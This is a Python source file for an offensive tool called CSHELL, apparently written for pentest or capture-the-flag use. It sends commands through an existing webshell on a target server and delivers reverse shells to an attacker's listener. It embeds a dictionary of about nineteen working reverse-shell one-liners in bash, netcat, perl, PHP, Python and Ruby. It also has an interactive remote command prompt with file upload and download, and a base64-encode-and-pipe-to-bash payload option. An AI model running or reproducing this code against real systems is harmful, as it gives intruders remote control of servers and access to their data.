#!/usr/bin/python3
import requests
import urllib.parse
import argparse
import os
import sys
import json
from datetime import datetime
import random
import time
import socket
import fcntl
import struct
import pyperclip as pc
import base64
from IPy import IP
import textwrap
import readline
from subprocess import Popen
import json


blue = "\033[34m"                                                                                                                                                                          
bold = "\033[1m"                                                                                                                                                                              
green = "\033[32m"                                                                                                                                                                            
purple = "\033[95m"                            
red = "\033[91m"                               
end = "\033[0m"                               


#=================================================================================================================================================	
#This contains all the payload for displaying the payload on the info area
#=================================================================================================================================================	
payloads_dict = { 
		"bash-196":"\t\t\tbash -c '0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196'",
		"bash":"\t\t\t\tbash -c 'bash -i >& /dev/tcp/127.0.0.1/1337 0>&1'",
		"bash-read-line":"\t\t\tbash -c 'exec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done'",
		"bash-5":"\t\t\t\tbash -c 'bash -i 5<> /dev/tcp/127.0.0.1/1337 0<&5 1>&5 2>&5'",
		"nc-mkfifo":"\t\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 1337 >/tmp/f",
		"nc":"\t\t\t\tnc -e /bin/bash 127.0.0.1 1337",
		"nc-c":"\t\t\t\tnc -c /bin/bash 127.0.0.1 1337",
		"ncat-e":"\t\t\t\tncat 127.0.0.1 1337 -e /bin/bash",
		"perl":"\t\t\t\tperl -e 'use Socket;$i=\"127.0.0.1\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'",
		"php-exec":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);exec(\"bash <&3 >&3 2>&3\");'",
		"php-shell-exec":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);shell_exec(\"bash <&3 >&3 2>&3\");'",
		"php-system":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);system(\"bash <&3 >&3 2>&3\");'",
		"php-passthru":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);passthru(\"bash <&3 >&3 2>&3\");'",
		"php-popen":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);popen(\"bash <&3 >&3 2>&3\", \"r\");'",
		"python":"\t\t\t\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
		"python-export":"\t\t\texport RHOST=\"127.0.0.1\";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
		"python3":"\t\t\t\tpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
		"python3-export":"\t\t\texport RHOST=\"127.0.0.1\";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")",
		"ruby":"\t\t\t\texport RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	}

# This idea of printing colored message was taken from Xyan1d3 (https://github.com/Xyan1d3)	
#=================================================================================================================================================	
  # [+] Green positive message   
#=================================================================================================================================================	       
def ap(text) :                  
    print(f"{bold}{green}[+] {end}{text}")

#=================================================================================================================================================	
 # [*] Purple info message  
#=================================================================================================================================================	                
def ainfo(text) :     
    print(f"{bold}{purple}[*] {end}{text}")

#=================================================================================================================================================	
# [-] Red negetive message 
#=================================================================================================================================================	
def aerr(text) :                              
    print(f"{bold}{red}[-] {end}{text}")

#=================================================================================================================================================	
# stating banner 
#=================================================================================================================================================	
def banner(): 
	print("""
 ??????????????????    ??????????????????  ????????? ?????? ??????????????????  ?????????     ?????????    
???????????? ??????  ?????????    ??? ???????????? ???????????????   ??? ????????????    ????????????    
?????????    ??? ??? ????????????   ????????????????????????????????????   ????????????    ????????????    
???????????? ????????????  ???   ?????????????????? ????????? ?????????  ??? ????????????    ????????????    
??? ??????????????? ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
??? ?????? ???  ?????? ????????? ??? ??? ??? ????????????????????? ?????? ?????? ?????????  ?????? ?????????  ???
  ???  ???   ??? ??????  ??? ??? ??? ????????? ??? ??? ???  ?????? ??? ???  ?????? ??? ???  ???
???        ???  ???  ???   ???  ?????? ???   ???     ??? ???     ??? ???   
??? ???            ???   ???  ???  ???   ???  ???    ???  ???    ???  ???
???                                                """) 


#=================================================================================================================================================	
#this function prints the info page which contains ip, port, target, payload, and payload-type
#=================================================================================================================================================	
def info(type, target , ip="0.0.0.0", port="1337" , payloadtype="bash" , base64encode=False , startlistener=True ): 
	now = datetime.now()
	dttime = now.strftime("%d-%m-%Y %H:%M:%S") # takes the time 
	print("========================================================================================================")
	print("CSHELL | By 0z09e | Twitter => https://twitter.com/0z09e")
	print("========================================================================================================")
	if type == 'rev':
		ainfo(f"Target\t\t{target}")
		ainfo(f"Listening IP\t{ip}")
		ainfo(f"Listening Port\t{str(port)}")
		ainfo(f"Payload format\t{payloadtype}")
		ainfo("Payload\t\t" + payloads_dict.get(payloadtype).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))) # This replace the target ip and port with the actual Attacker ip and port
	elif type == 'lstnr':
		ainfo(f"Listening IP\t{ip}")
		ainfo(f"Listening Port\t{str(port)}")
		ainfo(f"Payload format\t{payloadtype}")
	elif type == "web":
		ainfo(f"Target\t\t{target}")	
	print("========================================================================================================")
	ap(f"Starting CSHELL at {dttime}")
	print("========================================================================================================")

#=================================================================================================================================================	
# This function prints out the payload if --list_formats flags is set 
#=================================================================================================================================================	
def payload_list():
	print("========================================================================================================")
	print("Format-Name\t\t\tPayload")
	print("========================================================================================================")
	for key,value in payloads_dict.items(): #This prints all payloads
		print(key + value)



#=================================================================================================================================================	
# This function formats the command by replacing the WEB or REV
#=================================================================================================================================================
def type_replacer(typee , data , cmd):


	data_return = {}
	for key,value in data.items():
		if typee in value:
			data_return[key] = value.replace(typee , cmd)
		else:
			data_return[key]=value

	return data_return




#=================================================================================================================================================	
# This function checks the avalibility of the target, if the target is reachable or not. and it also checks if the .php file is there or not
#=================================================================================================================================================	
def avalability_check(target , type , method , data , headers , cookies , proxies ):
	ainfo("Checking avalability of the Address")
	splitted_target = list(map(str , target.split('/'))) # Splitts the .php file from the url example. 'cmd.php' from http://127.0.0.1/cmd.php
	splitted_php_param = list(map(str, splitted_target[-1].split("?")))
	try:
		if method == "GET":
			r = requests.get(target.replace(type , 'id') , headers=headers , cookies=cookies , proxies=proxies ) # Checks the availibility of the target by sending a get request
		elif method == "POST":
			data = type_replacer(type , data , 'id')
			r = requests.post(target , data=data , headers=headers , cookies=cookies , proxies=proxies )
		if r.status_code != 404: # Compares the status code to check the availability of the .php file
			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
				ainfo("Testing command execution") 
				return True
			else:
				aerr("Command exection failed.")
				if method == "GET":
					aerr(f"Check : {splitted_php_param[0]}")
					aerr("Exitting...")
				elif method == "POST":
					aerr(f"Check : {splitted_target[-1]}")
					aerr("Exitting...")
				return False
		else:
			aerr(f"Not found : {splitted_php_param[0]} ")
			return False
	except:
		aerr("Address isn't alive")
		aerr("Exitting...")
		return False


#=================================================================================================================================================	
# This function checks for the base of the payload example. 'bash' in bash -i /dev/tc..
#=================================================================================================================================================	
def payload_base_test(target , payloadtype , method , data , headers , cookies , proxies):
	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
	if method == "GET":
		ainfo(f"Testing the avalability of {payloadtype} on the target")
		r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}" , headers=headers , cookies=cookies , proxies=proxies )#sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
	elif method == "POST":
		ainfo(f"Testing the avalability of {payloadtype} on the target")

		data = type_replacer('REV' , data , f'which {payloadtype}')
		r = requests.post(target , data , headers=headers , cookies=cookies , proxies=proxies )
	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
		return True
	else:
		aerr(f"{payloadtype} isn't available on the target system. Try another one. use '--payloads' to list payloads.")
		aerr("Exitting...")
		return False
		quit()
#=================================================================================================================================================	
# This function sends the payload 
#=================================================================================================================================================	
def revshell(target  , ip ,fmt , port , method ,data,headers,cookies,proxies,nolstn=False):
	info( "rev" , target , ip , port , fmt , 'rev')
	if avalability_check(target  , "REV" , method , data , proxies=proxies , headers=headers , cookies=cookies) and payload_base_test(target , fmt , method  , data , proxies=proxies , headers=headers , cookies=cookies):
		try:
			payload = payloads(fmt , ip , port , method)
			if method.upper() == "GET":
				if nolstn:
					try:
						requests.get(target.replace("REV" ,  urllib.parse.quote_plus(payload)) , headers=headers , cookies=cookies , proxies=proxies , timeout=2)
					except:
						ap("Payload sent successfully")
						sys.exit()
				else:
					ainfo("Starting the listener")
					listener = Popen(["nc","-lvnp",port])
					ainfo("Sending the payload. Good luck :)\n")
					requests.get(target.replace("REV" , urllib.parse.quote_plus(payload)) , headers=headers , cookies=cookies , proxies=proxies )
			elif method.upper() == "POST":
				data = type_replacer('REV' , data , payload)
				if nolstn:
					try:
						requests.post(target , data=data , timeout=2 , headers=headers , cookies=cookies , proxies=proxies )
					except:
						ap("Payload sent successfully")
						sys.exit()
				else:
					ainfo("Starting listener")
					listener = Popen(["nc","-lvnp",port])
					ainfo("Sending payload. Good luck :)\n")
					requests.post(target , data=data , headers=headers , cookies=cookies , proxies=proxies)
		except KeyboardInterrupt:
			print()
			aerr("Exitting...")
			listener.kill()
			sys.exit()



#=================================================================================================================================================	
# this functiion generates the payload
#=================================================================================================================================================	
def payloads(fmt , ip , port , method):
	port = str(port)
	ainfo("Generating the Payload")
	if fmt in list(payloads_dict.keys()): # This checks if the given format is available on the payload or not
		payload = payloads_dict.get(fmt).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))
		return payload
	else:
		aerr("Payload format not found")
		aerr("Exitting..")
		exit()



#=================================================================================================================================================	
#This function creates a prompt for the cmd input
#=================================================================================================================================================	
def prompt(pwd , hostname , whoami):
    if whoami != 'root':
        prompt = f"{bold}{green}{whoami}{end}@{bold}{blue}{hostname}{end}:{pwd}$ "
        return prompt

    else:
        prompt = f"{bold}{red}{whoami}{end}{bold}@{bold}{blue}{hostname}{end}:{pwd}# "
        return prompt

    
#=================================================================================================================================================	
# This function filters the pwd and send it in correct form
#=================================================================================================================================================	

def pwd_filter(pwd):
    if ' ' in pwd: # it checks for spaces in pwd, if it is present then it encloses the pwd with quotes
        return f"\'{pwd}\'"
    else:
        return pwd


#=================================================================================================================================================	
# This function stores custom for webshell commands
#=================================================================================================================================================	

def custom_commands(cmd , pwd):

	def help():
		cmds = ['clear' , 'exit' , 'help' , 'upload' , 'download' ]
		for each in cmds:
			print(f"\t{cmds.index(each) + 1}. {each}")
		return ""

	def clear():
		print("\x1b[2J\x1b[H",end="")
		return ""


	def exit():
		ainfo("Exitting...")
		sys.exit()


	def upload(args , pwd):
		if len(args) != 3:
			print("cshell command : upload <Local-file-location [Absolute-Path-preffered]> <Remote-file-location [Absolute-Path-preffered]>")
			return ""
		else:
			localfile_abs_path = args[1]
			localfile_name = list(map(str , args[1].split("/")))[-1]
			localfile = base64.b64encode(open(args[1] , "rb").read()).decode()
			remotefile = args[2]
			if remotefile == ".":
				remotefile = pwd +  "/"+localfile_name
			else:
				if remotefile[-1] == "/":
					remotefile = remotefile + localfile_name
				else:
					remotefile = remotefile 
			

			ainfo(f"Uploading {localfile_abs_path} as {remotefile}")
			output = f"echo \'{localfile}\' | base64 -d > {remotefile}"
			return output
	def download(args):
		if len(args) != 3:
			print("cshell command : download <Remote-file-location [Absolute-Path-preffered]> <Local-file-location [Absolute-Path-preffered]>")
			sys.exit()
		else:
			global localfile
			remotefile = args[1]
			localfile = args[2]
			remotefile_name = list(map(str , remotefile.split("/")))[-1]
			if localfile == ".":
				localfile = os.getcwd() + "/" + remotefile_name
			else:
				if localfile[-1] == "/":
					localfile = localfile + remotefile_name
				else:
					localfile = localfile
			ainfo(f"Downloading {remotefile} as {localfile}")
			output = f"base64 -w0 {remotefile}"
			return output





	args = list(map(str , cmd.split()))
	base_cmd = args[0]
	if base_cmd == "help":
		return help()
	elif base_cmd == "clear":
		return clear()
	elif base_cmd == "exit":
		return exit()
	elif base_cmd == "upload":
		return upload(args=args , pwd=pwd)
	elif base_cmd == "download":
		return download(args)
	else:
		return cmd



def save_downloaded_file(cmd_inpt , output ):
	args = list(map(str , cmd_inpt.split()))
	base_cmd = args[0]
	if base_cmd == "download":
		file = open(localfile , "wb").write(base64.b64decode(output.rstrip().encode()))
		return True
	elif base_cmd == "upload":
		return True # Returning True here, just to prevent the code from priniting new line on response.
	else:
		return False


#=================================================================================================================================================
#	This function sends every command to the webshell
#=================================================================================================================================================	

def webshell(target ,method , param , data , headers , cookies , proxies):
	info("web" , target)
	if avalability_check(target , type="WEB" , method=method , data=data , cookies=cookies , proxies=proxies , headers=headers):
		try:
			ainfo("Use 'help' to see cshell-web commands")
			ainfo("Spawning prompt..")
			raw_data = data
			if method == "GET":
				r = requests.get(target.replace('WEB' , "echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]") , headers=headers , cookies=cookies , proxies=proxies )
			elif method == "POST":
				prompt_data = type_replacer(typee='WEB' , data=data , cmd="echo -n [OUTPUT_START][PWD_START]$(pwd)[PWD_END][HOSTNAME_START]$(hostname)[HOSTNAME_END][WHOAMI_START]$(whoami)[WHOAMI_END][OUTPUT_END]")
				r = requests.post(target , data=prompt_data , headers=headers , cookies=cookies , proxies=proxies )
			prompt_request = list(map( str , r.text.split("\n")))

			# Sample output : [OUTPUT_START][PWD_START]/home/test[PWD_END][HOSTNAME_START]ubuntu[HOSTNAME_END][WHOAMI_START]test[WHOAMI_END][OUTPUT_END]
			for line in prompt_request:
				if '[OUTPUT_START]' in line and '[OUTPUT_END]' in line:
					pwd = line.split("[OUTPUT_START][PWD_START]")[1].split("[PWD_END][HOSTNAME_START]")[0]
					hostname = line.split("[PWD_END][HOSTNAME_START]")[1].split("[HOSTNAME_END][WHOAMI_START]")[0]
					whoami = line.split("[HOSTNAME_END][WHOAMI_START]")[1].split("[WHOAMI_END][OUTPUT_END]")[0]
			readline.parse_and_bind('tab: complete')
			readline.parse_and_bind('set editing-mode vi')
			while 1:
				try:
					cmd_inpt = input(prompt(pwd , hostname , whoami)) #creaye prompt and asks for command
					custom_cmd_check = custom_commands(cmd_inpt , pwd=pwd)
					if custom_cmd_check != "": # check if command matches the help
						inpt = custom_cmd_check
					else:
						continue
					if method == "GET":
						cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
						res = requests.get(f"{target.replace('WEB' , cmd)}" , headers=headers , cookies=cookies , proxies=proxies )
					elif method == "POST":
						cmd = f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]"
						cmd_data = type_replacer('WEB' , data , cmd)
						res = requests.post(target , data=cmd_data , headers=headers , cookies=cookies , proxies=proxies )

					 # Replacing the web parameter with the cmd
					# Filtering the response and sorting necessary responses
					if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
						response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
						output = str("".join(response[:1])).rstrip()

						# Add this to download the file if user tries to download a file
						if not save_downloaded_file(cmd_inpt=cmd_inpt , output=output):
							print(output.rstrip())

						prompt_arr = list(map(str , response[1].split("[+]")))
						pwd = pwd_filter(prompt_arr[0].rstrip())
						hostname = prompt_arr[-2].rstrip()
						whoami = prompt_arr[-1].rstrip().replace("[PROMPT_END]" , "")
						
					# incase of error this prints out
					else:
						print(f"{red}{res.text.rstrip().replace('[OUTPUT_START]' , '')}")
				except KeyboardInterrupt:
					print()
					continue
		except EOFError:
			print()
			aerr("Exitting...")
			sys.exit()

#=================================================================================================================================================
#	This function extracts ip address from the interface names
#=================================================================================================================================================
def get_ip_address(ifname):
	if ifname in os.listdir('/sys/class/net/'): #checks the given interface in the host
		ifname = ifname.encode()
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24]) #returns the extracted ip from the interface name
	else:
		aerr(f"Interface \'{ifname}\' not found")
		ap(f"Available Inferfaces [{', '.join(os.listdir('/sys/class/net/'))}]")
		sys.exit()
#=================================================================================================================================================
#	This function generate anc copies the payload to the clipboard and starts listener 
# ======================================================================================
def listener(ifname , port , payload_type='bash' , nolistener=True , base64encode=False):
    try: #checks if -i parameter is interface name or IP
        if IP(ifname):
            ip = ifname
    except ValueError:
        ip = get_ip_address(ifname)
    if payload_type in list(payloads_dict.keys()):
        ainfo("Generating the payload")
        payload = payloads_dict.get(payload_type).replace("\t" , "").replace("127.0.0.1" , ip).replace("1337" , str(port)) #generates the payload
    else:
        aerr("Payload format not found")
        sys.exit()
	# Encodes the payload in base64 format
    if base64encode:
        ainfo("Encoding the payload into base64 format")
        payload_enc = payload.encode('ascii')
        b64_enc =base64.b64encode(payload_enc)
        b64_encoded_payload = b64_enc.decode('ascii')
        payload = f"echo {b64_encoded_payload}|base64 -d|bash"
    pc.copy(payload) #copy the payload into the clipboard
    ainfo(f"Payload : {payload}")
    ainfo("Payload has been copied to your clipboard")
    if not nolistener: #starts the listener
        ainfo("Starting the listener\n")
        os.system(f"nc -lvnp {port}")

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# The main function
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def main():
	if os.name == "nt":
		aerr("This script is only for linux kernels, Thank you.")
		sys.exit()
	# This are for the Arguments
	myparser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter ,  epilog=textwrap.dedent('''\
		web\tDirect command execution on the webshell with error message
		rev\tReverse shell from a working webshell
		lstnr\tGenerate payload, copy it to your clipboard and start a listener[Optional]\n

	'''))
	myparser.add_argument('--payloads' , action='store_true' , help='List all payload formats for rev' )
	subparsers = myparser.add_subparsers(dest='command')

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# reverse shell arguments
	rev = subparsers.add_parser("rev" ,formatter_class=argparse.RawDescriptionHelpFormatter , description='''Description : It takes a working a webshell as an argument, executes the payload and returns a reverse shell on the listener.
		''' )
	rev.add_argument('-f', metavar='Format', type=str, required=False , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"], default='bash' ,help='Reverse shell payload format. Default - bash')
	rev.add_argument('--nolstn' , action='store_true' , required=False , help="Don't start the listener" )
	rev.add_argument('-p', metavar='Listening-Port' ,  required=False ,default=1337 ,type=int, help='Attacker\'s Port In which the reverse shell will be recived [Default - 1337]. Note : Port must be in-between 1 to 65535')
	rev.add_argument('-m', metavar='Method' , required=False ,default="GET" , choices=['GET' , 'POST'] ,help='Method of sending the request, Supports : GET, POST')
	rev.add_argument('-d', metavar='Data' , required=False ,default='{"cmd" : "REV"}' , help='Add Data into the request (Send \'REV\' instead of the command). Example & Default Value : \'{"cmd" : "REV"}\'')
	rev.add_argument('-H', metavar='Headers' , required=False ,default='{}' , help='Add Headers into the request (all the headers must be in JSON format). Example {\"Host\" : \"127.0.0.1\"}')
	rev.add_argument('-c', metavar='Cookie' , required=False ,default='{}' , help='Add Cookies into the request (all the Cookies must be in JSON format). Example {\"PHPSESSID\" : \"1234567890abcdefghijkl\"}')
	rev.add_argument('-x', metavar='Proxy' , required=False ,default='{}' , help='Proxy the request (all the Proxie must be in JSON format). Example {\"http\" : \"127.0.0.1:8080\"}')
	


	rev_required = rev.add_argument_group('required arguments')
	rev_required.add_argument('-i', metavar='Listening-IP' , required=True , help='Attacker\'s IP or Interface name for reciving reverse shell')
	rev_pos = rev.add_argument_group('positional arguments')
	rev_pos.add_argument('Target', metavar='Target', default="test", help='Full URL of the target, Add \'REV\' as a command on the parametr. Example: http://127.0.0.1/webshell.php?cmd=REV')


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# web shell arguments
	web = subparsers.add_parser("web" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It takes a working reverse shell as an argument and executes command on that reverse shell in real time,\n\t      This also shows error message and persists the working directory')
	web.add_argument('-m', metavar='Method' , required=False , choices=['GET' , 'POST'] ,default="GET" ,help='Method of sending the request, Supports : GET, POST')
	web.add_argument('-d', metavar='Data' , required=False ,default='{"cmd" : "WEB"}' , help='Add Data into the request (Send \'WEB\' instead of the command). Example & Default Value : \'{"cmd" : "WEB"}\'')
	web.add_argument('-H', metavar='Headers' , required=False ,default='{}' , help='Add Headers into the request (all the headers must be in JSON format). Example {\"Host\" : \"127.0.0.1\"}')
	web.add_argument('-c', metavar='Cookie' , required=False ,default='{}' , help='Add Cookies into the request (all the Cookies must be in JSON format). Example {\"PHPSESSID\" : \"1234567890abcdefghijkl\"}')
	web.add_argument('-x', metavar='Proxy' , required=False ,default='{}' , help='Proxy the request (all the Proxies must be in JSON format). Example {\"http\" : \"127.0.0.1:8080\"}')

	web_required = web.add_argument_group('positional arguments')
	web_required.add_argument('Target',  metavar="Target" , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# listener Argument
	lstn = subparsers.add_parser("lstnr" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It generates and copies whatever payload from the payload list [You can list all the payloads using \'--payloads\']. it also starts a listener [Optional].')
	lstn.add_argument("-p" , metavar="Port" , required=False ,type=int , default=1337 , help="Reverse shell's port. [Default : 1337]")
	lstn.add_argument("-f" , metavar="Format" , choices=["bash-196","bash","bash-read-line","bash-5","nc-mkfifo","nc","nc-c","ncat-e","perl","php-exec","php-shell-exec","php-system","php-passthru","php-popen","python","python-export","python3","python3-export","ruby"] , required=False , default="bash" , help="Reverse shell's format. Default : bash")
	lstn.add_argument("--nolstn" , action='store_true' , required=False , help="Start the listener")
	lstn.add_argument("--b64" , action='store_true' , required=False , help="Encode the payload in base64 format. Example payload : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTAwMSAwPiYxCg== | base64 -d | bash")
	lstn.add_argument("-i" , metavar="Interface" , default='tun0', help="IP in which you want to send the reverse shell or you can specify the network interface. Example : -i 10.10.10.10 OR -i tun0, Default Value : \'tun0\'")
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

	
	args = myparser.parse_args()

#=====================================================================================================================================================

	if args.command == "rev":
			url = args.Target
			ip = args.i
			port = str(args.p)
			fmt = args.f
			nolstn = args.nolstn
			method = args.m.upper()
			data = json.loads(args.d)
			headers = json.loads(args.H)
			cookies = json.loads(args.c)
			proxy = json.loads(args.x)


			if ('REV' not in url and method == 'GET') or ('REV' not in str(data) and method == "POST"):
				aerr("\'REV\' not found on data or URL")
				sys.exit()
			if int(port) not in range(0 , 65535):
				print(f"cshell rev: error: argument -p: invalid choice: {port} (choose from 1 to 65535)")
				exit()

			try: 
				if IP(ip): #validated ip
					ip = ip
			except ValueError: # takes ip from interface
				ip = get_ip_address(ip)

			revshell(url , ip=ip , port=port , fmt=fmt , method=method , data=data, proxies=proxy , headers=headers , cookies=cookies ,  nolstn=nolstn)

#=====================================================================================================================================================


	elif args.command == "web":
		url = args.Target
		method = args.m.upper()
		data = json.loads(args.d)
		headers = json.loads(args.H)
		cookies = json.loads(args.c)
		proxy = json.loads(args.x)


		if ('WEB' not in url and method == 'GET') or ('WEB' not in str(data) and method == "POST"):
			aerr("\'WEB\' not found on data or URL")
			sys.exit()


		webshell(url , method , data , proxies=proxy , data=data , cookies=cookies , headers=headers )

#=====================================================================================================================================================


	elif args.command == "lstnr":
		ip = args.i
		port = args.p
		fmt = args.f
		nolstn = args.nolstn
		b64 = args.b64
		if int(port) not in range(0 , 65535):
			print(f"cshell rev: error: argument -p: invalid choice: {port} (choose from 1 to 65535)")
			exit()

		info("lstnr" , None , ip , port=port , payloadtype=fmt)
		listener(ip , port , payload_type=fmt , nolistener=nolstn , base64encode=b64)
	elif args.payloads:
		payload_list()
	else:
		banner()
		myparser.print_help()

#====================================================================< Function Ends Here >=================================================================================
main()